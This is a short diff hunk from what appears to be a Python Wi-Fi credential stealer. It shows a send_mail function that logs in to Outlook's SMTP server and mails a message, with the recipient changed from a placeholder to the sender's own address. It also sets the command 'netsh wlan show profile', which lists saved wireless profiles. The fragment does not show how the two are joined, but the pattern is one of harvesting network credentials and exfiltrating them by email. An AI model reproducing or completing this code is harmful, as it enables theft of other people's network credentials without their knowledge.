@@ -9,7 +9,7 @@ def send_mail(email,password,message):
     server = smtplib.SMTP("smtp-mail.outlook.com",587)
     server.starttls()
     server.login(email,password)
-    server.sendmail(email,"your email",message)
+    server.sendmail(email,email,message)
     server.quit()
     
 command="netsh wlan show profile"
